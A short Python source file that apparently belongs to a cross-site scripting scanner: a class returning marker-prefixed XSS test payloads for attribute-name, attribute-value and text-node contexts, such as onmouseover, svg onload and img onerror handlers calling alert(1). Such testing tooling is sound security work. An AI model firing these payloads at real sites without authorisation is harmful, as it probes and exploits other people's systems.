# gen.py 

class Gen:
    P = {
        "attribute_name": ["x onmouseover=alert(1)", "foo ondrag=alert(1)"],
        "html_attribute_value": ['" autofocus onfocus=alert(1) ', '"><svg/onload=alert(1)>'],
        "html_text_node": ["<script>alert(1)</script>", "<a></a><img src=x onerror=alert(1)>"],
    }

    def __init__(self, M="XYZ_TEST_MARKER"):
        self.M = M

    def get_payloads(self, C: str) -> list:
        return [self.M + p for p in self.P.get(C, [])]

    def get_marker(self):
        return self.M
